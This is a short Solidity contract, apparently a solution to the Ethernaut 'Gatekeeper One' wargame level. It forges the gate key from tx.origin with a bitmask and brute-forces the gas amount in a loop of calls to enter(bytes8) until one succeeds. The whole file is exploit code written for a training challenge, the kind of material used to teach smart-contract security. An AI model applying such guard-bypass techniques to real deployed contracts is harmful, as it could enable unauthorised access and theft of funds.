// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ExploitGatekeeperOne {
    address public immutable INSTANCE_ADDRESS;

    constructor(address instanceAddr) payable {
        INSTANCE_ADDRESS = instanceAddr;
    }

    function useKey() public {
        bytes8 arg = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        bytes memory data = abi.encodeWithSignature("enter(bytes8)", arg);
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, bytes memory returnData) = INSTANCE_ADDRESS.call{gas: i + 80000}(data);
            if (success) break;
        }
    }
}
